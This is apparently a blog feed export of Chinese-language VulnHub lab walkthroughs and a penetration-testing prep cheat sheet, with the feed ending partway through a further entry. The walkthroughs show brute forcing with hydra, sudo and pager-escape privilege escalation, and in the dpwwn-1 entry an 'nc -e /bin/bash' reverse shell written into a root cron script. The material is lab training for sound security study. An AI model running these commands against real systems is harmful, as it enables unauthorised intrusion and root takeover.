        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>mhz_cxf: c1f</h1><hr><p>easyNo.5</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/mhz_cxf-c1f,471/">vulnhub靶场-mhz_cxf: c1f</a></p><p>目标: root</p><p>提示: You will learn a little about enumeration/local enumeration , steganography.</p><p>妙妙工具: bash</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.18</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.56.18</span><br><span class="line"></span><br><span class="line">22/tcp open  ssh   </span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>80访问后是一个引导界面, 无时机作用, 进行目录扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.56.18</span><br><span class="line">dirsearch -u http://192.168.56.18</span><br></pre></td></tr></table></figure><p>还是没有, 而此处没有更多的利用点了, 那就换一个更大的字典扫描:</p><blockquote><p><code>/usr/share/wordlists/</code> 下有一大堆字典, dirb自己的字典小的不行, 我推荐用别的</p><p>字典太大内存爆了, 唉</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.56.18 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w</span><br></pre></td></tr></table></figure><p>反正就是扫到了(恼), 扫到一个<code>notes.txt</code>, 再等下去睡着了还没打出来</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105204043.png" alt="image.png"></p><p>找到<code>remb.txt</code>和<code>remb2.txt</code>两个文件, 其中<code>remb.txt</code>中有&quot;flag&quot;:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">first_stage:flagitifyoucan1234</span><br></pre></td></tr></table></figure><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>你说的对, 但是没思路就可以开始乱来了, 是不是账密我一试便知:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105204903.png" alt="image.png"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux mhz_c1f 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.15.0-96-generic</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看特权文件, 似乎没有</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看权限, 无发现</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 看看计划任务, 没东西</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>用户目录下有个user.txt, 让我们继续加油拿到root</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HEEEEEY , you did it </span><br><span class="line">that&#x27;s amazing , good job man</span><br><span class="line"></span><br><span class="line">so just keep it up and get the root bcz i hate low privileges ;)</span><br><span class="line"></span><br><span class="line">#mhz_cyber</span><br></pre></td></tr></table></figure><p>过了一会儿, 发现我们有权限读取mhz_c1f用户下的文件, 发现在Paintings文件夹下有四个jpeg文件</p><blockquote><p>要是root权限, 不然总是Permission denied</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo</span></span><br><span class="line">scp -r first_stage@192.168.56.18:/home/mhz_c1f/Paintings/ ./picture/</span><br></pre></td></tr></table></figure><p>提示说有图片隐写, 而jpeg常见的是藏文件, 低位数据隐写等</p><p>脚本小子登场:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 都试了一下发现只有它有, 密码为空</span></span><br><span class="line">steghide extract -sf spinning\ the\ wool.jpeg</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105230016.png" alt="image.png"></p><p>内容如下, 看起来是和之前一样格式的账号和密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ooh , i know should delete this , but i cant&#x27; remember it </span><br><span class="line">screw me </span><br><span class="line"></span><br><span class="line">mhz_c1f:1@ec1f</span><br></pre></td></tr></table></figure><p>不能用ssh登录, 猜测是直接su切换用户, 成功切换</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105230340.png" alt="image.png"></p><p>查看权限, 发现可以在任意位置执行sudo, 那就sudo提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105230535.png" alt="image.png"></p><blockquote><p>内核比较新, 以后看看能不能用脚本打</p></blockquote><p>在<code>root</code>文件夹下拿到最后一个提示<code>.root.txt</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OwO HACKER MAN :D</span><br><span class="line"></span><br><span class="line">Well done sir , you have successfully got the root flag.</span><br><span class="line">I hope you enjoyed in this mission.</span><br><span class="line"></span><br><span class="line">#mhz_cyber</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 隐写 </tag>
            
            <tag> 图片隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WestWild-1.1</title>
      <link href="/article/WestWild-1.1/"/>
      <url>/article/WestWild-1.1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>WestWild: 1.1</h1><hr><p>easyNo.4</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/westwild-11,338/">vulnhub靶场-WestWild: 1.1</a></p><p>目标: 反正就是拿到root</p><p>提示: 没有</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.17</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.56.17</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Not shown: 996 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure><p>访问80端口, 提示如下; 目录扫描没东西, 源代码也没东西, 那就放在一边吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is so easy you just have to follow the wave</span><br></pre></td></tr></table></figure><p>哇, 是smb服务, 我们有救了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -H 192.168.56.17</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231173100.png" alt="image.png"></p><p>那确实是wave, 那就看看有什么呗</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.56.17/wave</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231173354.png" alt="image.png"></p><p><code>FLAG1.txt</code>中是一段base64, 且message中提到了他忘记了密码想要重置; 解码base64发现是flag和账密</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K</span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">Flag1&#123;Welcome_T0_THE-W3ST-W1LD-B0rder&#125;</span><br><span class="line">user:wavex</span><br><span class="line">password:door+open</span><br></pre></td></tr></table></figure><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>尝试用账密登录ssh, 成功登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh wavex@192.168.56.17</span><br><span class="line">door+open</span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux WestWild 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:28:33 UTC 2019 i686 i686 i686 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.4.0-142-generic</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看特权文件, ping?</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看权限, 无发现</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 看看计划任务, 发现有东西</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>在用户目录下有个wave文件夹, 里面有<code>FLAG1.txt</code>和<code>message</code>, 没啥用</p><p>查看<code>home</code>看看有没有别的用户, 发现有aveng, 然后没东西了</p><p>看看什么地方能写</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable -<span class="built_in">type</span> f ! -path <span class="string">&#x27;/proc/*&#x27;</span> 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 可疑文件</span></span><br><span class="line">/usr/share/av/westsidesecret/ififoregt.sh</span><br></pre></td></tr></table></figure><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>既然是4.4.0内核, 先来试试<code>linux/local/45010.c</code></p><p>哈哈, 是<code>-bash: ./45010: cannot execute binary file: Exec format error</code>, 我们没救了</p><blockquote><p>gcc没问题, 大概率是64位和32位问题, 这个文件不能编译为32位的文件</p></blockquote><p>老老实实看看可疑文件</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231181523.png" alt="image.png"></p><p>是账号密码! 我们又有救了, 直接su切换用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aveng : kaizen+80</span><br></pre></td></tr></table></figure><p>再收集一下, 发现有sudo权限, 唉那就不收集了, 结束战斗</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231182335.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231182419.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sudo提权 </tag>
            
            <tag> 横向移动 </tag>
            
            <tag> 用户横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dpwwn-1</title>
      <link href="/article/dpwwn-1/"/>
      <url>/article/dpwwn-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>dpwwn: 1</h1><hr><p>easyNo.3</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/dpwwn-1,342/">vulnhub靶场-dpwwn: 1</a></p><p>目标: Gain the root privilege and obtain the content of dpwwn-01-FLAG.txt under /root Directory.</p><p>提示: Easy/helpful for beginners.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.110.130</li><li>target: 192.168.110.134</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.110.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.110.134</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh  OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http  Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">3306/tcp open  mysql  MySQL 5.5.60-MariaDB</span><br><span class="line">MAC Address: 00:0C:29:0C:34:F2 (VMware)</span><br><span class="line"></span><br><span class="line">OS: CentOS, Linux 3.2 - 4.9</span><br></pre></td></tr></table></figure><p>目录扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.110.134/</span><br><span class="line"></span><br><span class="line">+ http://192.168.110.134/cgi-bin/</span><br><span class="line">+ http://192.168.110.134/info.php</span><br><span class="line">+ http://192.168.110.134/icons/</span><br></pre></td></tr></table></figure><p>其中<code>info.php</code>界面为phpinfo, 没有disable_functions设置, 但是同样没有可以利用的点, 拉倒了</p><p>那就试试mysql, 尝试爆破账号密码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.110.134 mysql</span><br></pre></td></tr></table></figure><p>能爆破说明可以远程root登录, 但是跑完了字典也不行, 结果试出来密码为空; 开始查询mysql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use ssh;</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br><span class="line"># mistic  testP@$$swordmistic</span><br></pre></td></tr></table></figure><p>那个mysql表里面也有一个user, 可惜只有root; 现在拿到了账号密码, 尝试登录ssh</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mistic@192.168.110.134</span><br><span class="line">testP@$<span class="variable">$swordmistic</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231152808.png" alt="image.png"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux dpwwn-01 3.10.0-957.el7.centos.plus.i686 #1 SMP Wed Nov 7 19:17:19 UTC 2018 i686 i686 i386 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 3.10.0-957.el7.centos.plus.i686</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看特权文件, 没啥东西</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看权限, 没发现</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 自启动看看, 发现有东西</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>执行<code>cat /etc/crontab</code>发现有一个自启动文件且文件在我们用户目录下, 同时自启动文件的执行权限为root, 可以用于反弹shell</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>不要想着编辑<code>/etc/crontab</code>了, 那个改不了</p><p>可以用vi编辑<code>logrot.sh</code>, 或者直接用echo也行</p><blockquote><p>不像记住反弹shell你就用msf生成一个呗</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;msfvenom -p cmd/unix/reverse_bash lhost=192.168.110.130  lport=7777</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 清空文件然后添加:</span></span><br><span class="line">nc -e /bin/bash 192.168.110.130 7777</span><br><span class="line"><span class="comment"># 或者直接echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash 192.168.110.130 7777&quot;</span> &gt; logrot.sh</span><br></pre></td></tr></table></figure><p>然后稍等一会儿即可拿到shell</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231162808.png" alt="image.png"></p><p>再来拿flag就行, 就在<code>/root</code>下</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> MySQL </tag>
            
            <tag> 计划任务提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Broken-Gallery</title>
      <link href="/article/Broken-Gallery/"/>
      <url>/article/Broken-Gallery/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Broken: Gallery</h1><hr><p>easyNo.2</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/broken-gallery,344/">vulnhub靶场-Broken: Gallery</a></p><p>提示: Privilege escalation is another method of security through obscurity.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.110.130</li><li>target: 192.168.110.133</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.110.133</span><br><span class="line"></span><br><span class="line">22/tcp    ssh</span><br><span class="line">80/tcp    http</span><br></pre></td></tr></table></figure><p>从http中找到一个README.md文件, 看着似乎是JPG头(JFIF), 于是我们写个py脚本将这个文件恢复回JPG:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">hex_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将十六进制字符串转换为字节数据</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_hex_data_from_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从文件中读取十六进制字节数据</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">    <span class="comment"># 提取所有的十六进制数值：例如 &quot;0xFF, 0xD8&quot; 提取为 &quot;FF D8&quot;</span></span><br><span class="line">    hex_values = re.findall(<span class="string">r&#x27;0x([0-9A-Fa-f]&#123;2&#125;)&#x27;</span>, data)</span><br><span class="line">    hex_string = <span class="string">&#x27; &#x27;</span>.join(hex_values)</span><br><span class="line">    <span class="keyword">return</span> hex_to_bytes(hex_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_image_from_bytes</span>(<span class="params">byte_data, output_file</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将字节数据保存为图片文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> img_file:</span><br><span class="line">        img_file.write(byte_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;图片已保存为 &#x27;<span class="subst">&#123;output_file&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_data = read_hex_data_from_file(<span class="string">&#x27;readme.txt&#x27;</span>)</span><br><span class="line">save_image_from_bytes(hex_data, <span class="string">&#x27;output_image.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到的图片内容如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello Bob,</span><br><span class="line"></span><br><span class="line">The application is BROKEN ! the whole infrastructure is BROKEN !!!!</span><br><span class="line"></span><br><span class="line">I am leaving for my summer vacation,I hope you get it fix soon...</span><br><span class="line"></span><br><span class="line">Cheers.</span><br><span class="line"></span><br><span class="line">avrahamcohen.ac@gmail.com</span><br></pre></td></tr></table></figure><p>然后就没有内容了, 那就只能对22端口进行爆破了</p><p>先尝试将所有可能的内容都塞进用户名, 然后跑密码字典</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl 192.168.110.133 -w user.txt</span><br><span class="line"><span class="comment"># 手动将图片内容的单词添加上去</span></span><br><span class="line">hydra -L user.txt -P pass.txt ssh://192.168.110.133</span><br><span class="line"><span class="comment"># 或者你直接跑/usr/share/wordlists/rockyou.txt.gz(没试过)</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241220174620.png" alt="image.png"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>正常利用<code>broken : broken</code>登录</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.4.0-21-generic</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">gcc -v</span><br><span class="line">python -h</span><br><span class="line"><span class="comment"># 查看特权文件, 没啥东西</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 自启动看看, 没东西</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="comment"># 看看权限, 发现有sudo权限</span></span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241220175657.png" alt="image.png"></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>文件<code>/usr/bin/timedatectl</code>在拥有sudo权限可以用于提权(直接复制粘贴即可):</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在/usr/bin文件夹下</span></span><br><span class="line">sudo timedatectl list-timezones</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241220180206.png" alt="image.png"></p><blockquote><p><code>list-timezones</code>是列出时区的子命令, 运行sudo timedatectl list-timezones会显示类似less/more查看的方式; 而键入感叹号<code>!</code>表示执行系统命令, 此时是root权限, 所以会返回一个root权限的shell</p></blockquote><p>再来试试脚本: ubuntu 4.4.0-21-generic可以用45010.c</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate linux/local/45010.c</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241220181924.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 编辑器提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透的准备工作</title>
      <link href="/article/how-to-prepare/"/>
      <url>/article/how-to-prepare/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html">hacktricks</a></p><p><a href="https://www.exploit-db.com/">漏洞库</a></p><p>主要的工具一般下载kali基本齐全</p><h1>信息收集</h1><p>nmap</p><p>目录枚举, dirbuster, gobuster, dirsearch</p><p>kali自身拥有一些字典, 比如<code>/usr/share/wordlists/dirbuster/</code>下的文件, <code>/usr/share/wordlists/rockyou.txt.gz</code>等</p><h1>流量捕获/分析</h1><p>burpsuite</p><p>wireshark</p><h1>反弹shell</h1><p>利用ncat在端口上进行监听, 利用生成或者现成的反弹shell获得连接, 随后可能利用python获取一个交互shell</p><p>下面是一个获取pty交互式shell的方式</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">ctrl+z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>;<span class="built_in">fg</span></span><br></pre></td></tr></table></figure><h1>文件传输</h1><p>利用py开启一个简单的http服务, 让另一方利用wget下载即可(自定义端口)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span></span><br><span class="line">python3 -m http.server <span class="number">8081</span></span><br></pre></td></tr></table></figure><p>或者双方都有ncat, 可以利用ncat传输</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 靶机: 将返回数据存储到reverse_shell.php</span></span><br><span class="line">nc 192.168.56.5 10000 &gt; reverse_shell.php</span><br><span class="line"><span class="comment"># kali: 端口被访问时提供reverse_shell.php的文件内容</span></span><br><span class="line">nc -lvnp 10000 &lt; reverse_shell.php</span><br></pre></td></tr></table></figure><h1>本地信息枚举</h1><p><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPEAS</a></p><p><a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">WinPEAS</a></p><p><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></p><p>甚至还有MacPEAS</p><p><a href="https://github.com/DominicBreuker/pspy">pspy</a></p><h1>本地脆弱性</h1><p>了解有什么本地脆弱性, 才能更好的提权</p><h2 id="泄露的登录凭证"><a class="header-anchor" href="#泄露的登录凭证">¶</a>泄露的登录凭证</h2><p>用于横向移动甚至越权</p><h2 id="不安全的程序功能"><a class="header-anchor" href="#不安全的程序功能">¶</a>不安全的程序功能</h2><p>-h或-help并不是完整的帮助信息, 如果需要则使用man命令(manual的缩写). 此时如果部分程序有命令执行功能, 这就是一个可能的漏洞点</p><h2 id="sudo权限分配"><a class="header-anchor" href="#sudo权限分配">¶</a>sudo权限分配</h2><p>部分用户在特定目录有sudo权限, 或者访问控制没做好, 可以利用这个获取root/shell</p><h2 id="密码复用"><a class="header-anchor" href="#密码复用">¶</a>密码复用</h2><p>顾名思义, 可能部分服务/用户/程序用户密码都是一样的</p><h2 id="操作系统内核漏洞"><a class="header-anchor" href="#操作系统内核漏洞">¶</a>操作系统内核漏洞</h2><p>没有及时更新补丁/系统导致的, 这个一般放在最后因为可能会对系统造成影响</p>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyFileServer-1</title>
      <link href="/article/MyFileServer-1/"/>
      <url>/article/MyFileServer-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>My File Server: 1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/my-file-server-1,432/">vulnhub靶场-My File Server: 1</a></p><p>目标: get root</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.104</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line"></span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  